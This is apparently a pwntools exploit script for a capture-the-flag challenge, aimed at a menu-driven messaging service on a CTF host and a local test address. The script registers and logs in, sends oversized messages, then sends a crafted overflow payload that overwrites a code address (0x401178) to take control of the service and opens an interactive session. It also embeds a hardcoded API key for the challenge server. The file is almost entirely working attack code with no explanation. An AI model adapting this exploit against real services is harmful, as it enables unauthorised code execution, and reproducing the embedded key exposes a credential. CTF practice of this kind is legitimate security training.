from pwn import *
import json
HOST = "disposable.eatpwnnosleep.com"
PORT = 30020
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
  a = {
      'apikey' : "a7d4eeae97f394fc427ebfac74e8158c9aa578136716cc72e081edce445ba3e2",
      }

  s.send(json.dumps(a).encode())
else:
  s = remote('192.168.33.10',PORT)
def reg(name,pw):
  s.recvuntil('>')
  s.sendline('2')
  s.recvuntil('username:')
  s.sendline(name)
  s.recvuntil('password:')
  s.sendline(pw)
def login(name,pw):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil('username:')
  s.sendline(name)
  s.recvuntil('password:')
  s.sendline(pw)
def send_msg(to, msg):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil('whom?')
  s.sendline(to)
  s.recvuntil('message:')
  s.sendline(msg)
def view():
  s.recvuntil('>')
  s.sendline('2')
def leak(): 
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil('whom?')
  s.sendline("0")
def out():
  s.recvuntil('>')
  s.sendline('4')
raw_input()
reg("A"*60,"A"*60)
login("A"*60,"A"*60)
send_msg("A"*60,"E"*254)
view()
send_msg("A"*60,"C"*254)
magic= 0x00401178     
send_msg("0","\xde"*0x58+"\x42"*(0x50-0x20+0x8)+p64(magic)*1+"C"*0x10+"C"*0x4+p32(4)+"C"*0x40)
login("A"*60,"A"*60)
send_msg("A"*60,"1234")
view()
view()
view()
view()
send_msg("A"*60,"1234")
s.interactive()
